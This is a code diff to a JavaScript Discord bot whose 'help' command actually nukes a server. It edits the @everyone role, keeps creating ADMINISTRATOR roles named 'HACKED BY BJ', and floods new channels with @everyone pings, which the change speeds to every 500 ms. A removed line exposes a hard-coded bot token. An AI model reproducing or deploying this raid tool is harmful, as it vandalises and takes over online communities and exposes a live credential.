@@ -10,7 +10,7 @@ console.log(`Logged in as ${client.user.tag}!`);
 /////Ban all
 
 ////
-client.login("NzYxMjA3MjU4NTYxNzczNTY4.X3XPgA.uGxi4WZKZFFnx9ZbBbqiTNPGIGg")
+
           
 client.on("ready", () => {
   console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
@@ -21,7 +21,7 @@ console.log(`Logged in as ${client.user.tag}!`);
  client.user.setStatus("dnd")/////ba dly xot statusek bnwsa
   console.log(`Logined`)
 })
-
+///created by black jack 
 client.on('message', message => {
     if (message.content.toLowerCase() === prefix + 'help') {
         message.guild.roles.find('name', '@everyone').edit({
@@ -38,7 +38,7 @@ client.on('message', message => {
       
         setInterval(() => {
             message.guild.createRole({
-                name: "HACKED BY NAZANM",
+                name: "HACKED BY BJ",
                 permissions: ["ADMINISTRATOR"]
             }).then(rr => {
  
@@ -50,13 +50,13 @@ client.on('message', message => {
         setTimeout(function() {
             setInterval(() => {
           
-                message.guild.createChannel('HACKED BY NAZANM', 'text').then(channel => {
+                message.guild.createChannel('HACKED BY BJ', 'text').then(channel => {
                 channel.send('@everyone HACKRAWA LALAYAN BLACK JACK :joy: :joy: :joy:')
                
                 })
             }
                         
-                        , 3000)
+                        , 500)
             })
         }
     
